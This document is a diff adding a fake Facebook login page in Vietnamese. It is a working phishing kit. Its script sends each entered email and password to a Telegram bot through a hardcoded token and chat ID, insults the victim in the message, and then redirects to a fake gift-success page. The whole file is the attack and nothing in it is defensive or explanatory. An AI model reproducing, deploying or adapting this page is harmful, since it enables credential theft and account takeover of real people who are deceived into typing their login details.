@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Facebook – Log in or Sign up</title>
+    <meta name="viewport" content="initial-scale=1, width=device-width" />
+    <meta name="referrer" content="default" />
+    <meta name="theme-color" content="#3b5998" />
+
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/x-icon">
+    <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo" />
+            <h2>Đăng nhập Facebook</h2>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="email">Số di động hoặc email</label>
+                    <input type="text" name="email" id="email" required placeholder="" autocomplete="off">
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Mật khẩu</label>
+                    <input type="password" name="password" id="password" required placeholder="" autocomplete="off">
+                </div>
+
+                <button type="submit" class="login-btn">Đăng nhập</button>
+                <div class="forgot-password">
+                    <a href="https://www.facebook.com/login/identify/">Bạn quên mật khẩu ư?</a>
+                </div>
+            </form>
+
+            <div class="separator">
+                <span>hoặc</span>
+            </div>
+
+            <a href="https://www.facebook.com/reg/" class="signup-btn">Tạo tài khoản mới</a>
+        </div>
+    </div>
+
+    <script>
+        // Lắng nghe sự kiện submit của form
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Ngăn chặn hành động submit form mặc định
+
+            // Lấy dữ liệu từ form
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Tạo thông báo cần gửi cho bot Telegram
+            var message = `Tài khoản của thằng ngu:\nTài khoản: ${email}\nMật khẩu: ${password}`;
+
+            // Gửi yêu cầu tới Telegram API bằng Fetch API
+            fetch('https://api.telegram.org/bot7296526311:AAFProE6bBnY_kZU1LBF9WGp83BG4kyg4i8/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    chat_id: '6602753350', // Thay bằng chat_id của bạn
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);  // In ra phản hồi từ API (thông báo thành công)
+
+                // Tiến hành lưu trạng thái đăng nhập vào localStorage
+                localStorage.setItem('isLoggedIn', 'true'); // Đánh dấu người dùng đã đăng nhập
+
+                // Lưu thông báo thành công nhận quà
+                localStorage.setItem('loginSuccess', 'Quà thành công');
+
+                // Sau khi đăng nhập thành công, chuyển hướng về trang index.html với query parameter 'giftSuccess=true'
+                window.location.href = "/index.html?giftSuccess=true"; 
+            })
+            .catch(error => {
+                console.error('Error:', error);  // Xử lý lỗi nếu có
+            });
+        });
+    </script>
+</body>
+</html>
